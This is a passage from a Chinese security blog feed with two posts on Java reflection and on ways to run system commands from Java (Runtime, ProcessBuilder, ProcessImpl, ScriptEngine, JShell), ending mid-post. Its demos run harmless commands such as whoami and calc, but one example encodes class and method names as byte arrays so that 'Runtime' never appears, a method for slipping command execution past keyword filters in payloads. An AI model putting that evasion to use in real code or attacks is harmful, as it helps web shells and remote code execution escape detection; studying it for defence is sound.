        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>Java反射是Java非常重要的动态特性，反射的核心是当JVM处于运行状态时才动态加载类，此时对于任意类都能够知道该类的所有的属性和方法，并且能够调用任意一个对象的方法，这种动态获取信息和动态调用对象方法的功能称之为Java的反射机制。通过使用反射，不仅可以获取到任意类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。其中需要注意的是，Java的反序列化问题都基于反射机制。</p><h2 id="反射机制流程"><a href="#反射机制流程" class="headerlink" title="反射机制流程"></a>反射机制流程</h2><p>在下图中，首先创建了一个类，在javac编译过后会形成class文件，与此同时jvm内存会查找生成的class文件并读入内存中，经过ClassLoader加载，接着会自动创建一个Class对象，里面拥有其成员变量、成员方法、构造方法等，最后是常见的new创建对象。</p><p><img src="/2023/03/13/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1710260419014-13d62c68-0a37-4dcc-9177-e2b5c787c8bf.png"></p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 方法一: 已知具体的类, 通过类的class属性获取, 安全性高, 程序性能好, 多用于参数的传递</span><br><span class="line"><span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> reflectTestClass.class;</span><br><span class="line"></span><br><span class="line"># 方法二: 已知某个类的实例, 调用该实例的getClass方法获取class对象, 多用于对象的获取字节码的方式</span><br><span class="line"><span class="type">ReflectTestClass</span> <span class="variable">reflectTestClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectTestClass</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">class2</span> <span class="operator">=</span> reflectTestClass.getClass();</span><br><span class="line"></span><br><span class="line"># 方法三: 已知一个类的名称及路径, 且在该类路径下可以通过class类的静态方法forName获取, 需要注意可能抛出ClassNotFoundException, 多用于配置文件</span><br><span class="line"><span class="type">Class</span> <span class="variable">class3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;CyberSpace.reflectTestClass&quot;</span>);</span><br><span class="line"></span><br><span class="line"># 方法四: 利用ClassLoader来获取类</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getClassLoader();</span><br><span class="line"><span class="type">Class</span> <span class="variable">class4</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;CyberSpace.reflectTestClass&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2023/03/13/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1710260419249-36c2a264-4dec-437b-818a-7d232351db65.png"></p><h3 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Class#getFields()    ## 获取所有的<span class="keyword">public</span>修饰的成员变量</span><br><span class="line">java.lang.Class#getField(String)    ## 获取指定名称的<span class="keyword">public</span>修饰的成员变量</span><br><span class="line">java.lang.Class#getDeclaredFields()    ## 获取所有的成员变量(不考虑修饰符)</span><br><span class="line">java.lang.Class#getDeclaredField(String)    ## 获取指定名称的成员变量(不考虑修饰符)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/13/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1710260419516-b8f0846e-3c10-4523-80a0-b3781b5eea2f.png"></p><h3 id="获取成员方法Method"><a href="#获取成员方法Method" class="headerlink" title="获取成员方法Method"></a>获取成员方法Method</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Class#getMethods()    ## 返回所有的<span class="keyword">public</span>方法, 包括类自身声明的<span class="keyword">public</span>方法, 父类中的<span class="keyword">public</span>方法、实现的接口方法等</span><br><span class="line">java.lang.Class#getMethod(String, Class[])    ## 返回该类或接口所声明的<span class="keyword">public</span>方法</span><br><span class="line">java.lang.Class#getDeclaredMethods()    ## 返回该类所有声明方法, 但不包括继承方法</span><br><span class="line">java.lang.Class#getDeclaredMethod(String, Class[])    ## 返回该类指定的声明方法</span><br></pre></td></tr></table></figure><p><img src="/2023/03/13/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1710260419765-6cda7ab4-811b-4db3-80d1-2b49e847667d.png"></p><h3 id="获取构造方法Constructor"><a href="#获取构造方法Constructor" class="headerlink" title="获取构造方法Constructor"></a>获取构造方法Constructor</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Class#getConstructors()    ## 返回<span class="keyword">public</span>修饰的构造函数</span><br><span class="line">java.lang.Class#getConstructor(Class[])    ## 返回匹配和参数配型相符的<span class="keyword">public</span>修饰的构造函数</span><br><span class="line">java.lang.Class#getDeclaredConstructors()    ## 返回匹配和参数配型相符的构造函数(不考虑修饰符)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/13/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1710260419938-b515ece5-bc01-4bdf-be35-c2ce9a06e706.png"></p><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>Runtime函数有exec方法可以供本地执行命令，在jsp中大部分命令执行的payload都是调用Runtime的exec方法来进行命令执行的。</p><h3 id="非反射执行命令"><a href="#非反射执行命令" class="headerlink" title="非反射执行命令"></a>非反射执行命令</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream();</span><br><span class="line">        System.out.println(IOUtils.toString(inputStream, <span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/13/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1710260420196-5aa47df4-37e5-4f65-b36b-0b4d8fe2953b.png"></p><h3 id="反射执行命令"><a href="#反射执行命令" class="headerlink" title="反射执行命令"></a>反射执行命令</h3><p>在非反射执行命令中，代码格式基本上是定死的，当需要多次传入参数执行命令时，便可以利用反射来完成需求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilReflectClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;ipconfig&quot;</span>;  <span class="comment">// 待执行的命令</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);   <span class="comment">// 将Runtime加载进内存中</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor();   <span class="comment">// 获取构造方法</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);    <span class="comment">// 暴力反射, 设置权限可访问</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtimeObject</span> <span class="operator">=</span> constructor.newInstance();   <span class="comment">// 创建Runtime类</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);    <span class="comment">// 获取Runtime类中exec方法</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) exec.invoke(runtimeObject, command);    <span class="comment">// 执行exec方法</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream(); <span class="comment">//获取输出数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> IOUtils.toString(inputStream, <span class="string">&quot;gbk&quot;</span>);   <span class="comment">// 将字节输出流转换为字符</span></span><br><span class="line">        System.out.println(output); <span class="comment">// 打印输出字符</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/13/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/1710260420463-7cea0300-eaf0-44cb-b3ad-2247d34804ce.png"></p><p>特别的，method.invoke中第一个参数必须为类实例对象，当调用的是static方法时该值可以为null(在Java中调用静态方法不需要有类实例，可以直接用类名.方法名进行调用)；method.invoke中第二个参数不是必要的，若当前调用方法中无参数时，则第二个参数可以没有，但是若有参数，则必须严格的依次传入对应的参数。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java命令执行</title>
      <link href="/2023/03/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/03/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java中执行命令的方法主要有java.lang.Runtime#exec，java.lang.ProcessBuilder#start以及java.lang.ProcessImpl#start，它们之间的调用关系如下图所示。</p><p><img src="/2023/03/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1710320176982-a1237757-6103-44f9-bd73-a7aac7c60537.png"></p><h2 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h2><p>Java中最为常见命令执行方式就是使用java.lang.Runtime#exec方法来执行本地系统命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.security;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeExecDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream();</span><br><span class="line">        System.out.println(IOUtils.toString(inputStream, <span class="string">&quot;gbk&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在某些时刻由于一些特殊的原因可能不能出现Runtime相关的关键词，此时可以采用反射的形式进行实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.security.CommandExecution;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RuntimeReflectDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] classNameBytes = className.getBytes(); <span class="comment">// [106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101]</span></span><br><span class="line">        System.out.println(Arrays.toString(classNameBytes));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> <span class="string">&quot;getRuntime&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] methodNameBytes = methodName.getBytes(); <span class="comment">// [103, 101, 116, 82, 117, 110, 116, 105, 109, 101]</span></span><br><span class="line">        System.out.println(Arrays.toString(methodNameBytes));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName2</span> <span class="operator">=</span> <span class="string">&quot;exec&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] methodNameBytes2 = methodName2.getBytes(); <span class="comment">// [101, 120, 101, 99]</span></span><br><span class="line">        System.out.println(Arrays.toString(methodNameBytes2));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName3</span> <span class="operator">=</span> <span class="string">&quot;getInputStream&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] methodNameBytes3 = methodName3.getBytes(); <span class="comment">// [103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109]</span></span><br><span class="line">        System.out.println(Arrays.toString(methodNameBytes3));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        <span class="comment">// 反射java.lang.Runtime类获取class对象</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;));</span><br><span class="line">        <span class="comment">// 反射获取Runtime类的getRuntime方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;));</span><br><span class="line">        <span class="comment">// 反射获取Runtime类的exec方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> clazz.getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>&#125;), String.class);</span><br><span class="line">        <span class="comment">// 反射调用Runtime.getRuntime().exec()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> method2.invoke(method1.invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;payload&#125;);</span><br><span class="line">        <span class="comment">// 反射获取Process类的getInputStream方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method3</span> <span class="operator">=</span> obj.getClass().getMethod(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>&#125;));</span><br><span class="line">        method3.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> (InputStream) method3.invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        System.out.println(IOUtils.toString(inputStream, <span class="string">&quot;gbk&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h2><p>ProcessBuilder类用于创建操作系统进程。每个ProcessBuilder实例管理一个进程属性集，其start方法利用这些属性来创建进程。由于java.lang.Runtime#exec后续会调用到java.lang.ProcessBuilder#start，并且ProcessBuilder#start是public类型的，因此也可以直接利用其来执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.security.CommandExecution;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessBuilderDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;ipconfig&quot;</span>, <span class="string">&quot;/all&quot;</span>).start().getInputStream();</span><br><span class="line">            System.out.println(IOUtils.toString(inputStream, <span class="string">&quot;gbk&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ProcessImpl"><a href="#ProcessImpl" class="headerlink" title="ProcessImpl"></a>ProcessImpl</h2><p>对于java.lang.ProcessImpl类并不能直接调用，但是可以通过反射来间接调用ProcessImple#start来达到命令执行的目的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.security.CommandExecution;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProcessImplDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] exp = &#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;ipconfig&quot;</span>, <span class="string">&quot;/all&quot;</span>&#125;;</span><br><span class="line">            Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="type">boolean</span>.class);</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> ((Process) method.invoke(<span class="literal">null</span>, exp, <span class="literal">null</span>, <span class="string">&quot;.&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>)).getInputStream();</span><br><span class="line">            System.out.println(IOUtils.toString(inputStream, <span class="string">&quot;gbk&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h2><p>javax.script.ScriptEngine类是Java自带的用于解析并执行JS代码。ScriptEngine接口中有一个eval方法，可以执行Java代码。但需要注意的是，需要在有相应engine的环境中才能有效。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.security.CommandExecution;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScriptEngineDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ScriptException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;function demo() &#123;return java.lang.Runtime&#125;;d=demo();d.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;</span><br><span class="line">        <span class="comment">// String exp = &quot;var test=Java.type(\&quot;java.lang.Runtime\&quot;); print(test.getRuntime().exec(\&quot;calc\&quot;))&quot;;</span></span><br><span class="line">        <span class="comment">// String exp = &quot;var CollectionsAndFiles = new JavaImporter(java.lang);with (CollectionsAndFiles)&#123;var x= Runtime.getRuntime().exec(\&quot;calc\&quot;)&#125;&quot;;</span></span><br><span class="line">        <span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">        <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> manager.getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">        engine.eval(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JShell"><a href="#JShell" class="headerlink" title="JShell"></a>JShell</h2><p>从Java 9开始提供了一个叫jshell的功能，jshell是一个REPL(Read-Eval-Print Loop)命令行工具，提供了一个交互式命令行界面，在jshell中不再需要编写类也可以执行Java代码片段，开发者可以像python和php一样在命令行下写测试代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.security.CommandExecution;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.jshell.JShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JShellDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            JShell.builder().build().eval(<span class="keyword">new</span> <span class="title class_">String</span>(Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>).getInputStream().readAllBytes()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>在Windows中，当要进行写文件等操作时，命令前缀要加cmd &#x2F;c。在下图中示例代码执行echo “h3rmesk1t” &gt; 1.txt时，可以看到是无法执行成功的。</p><p><img 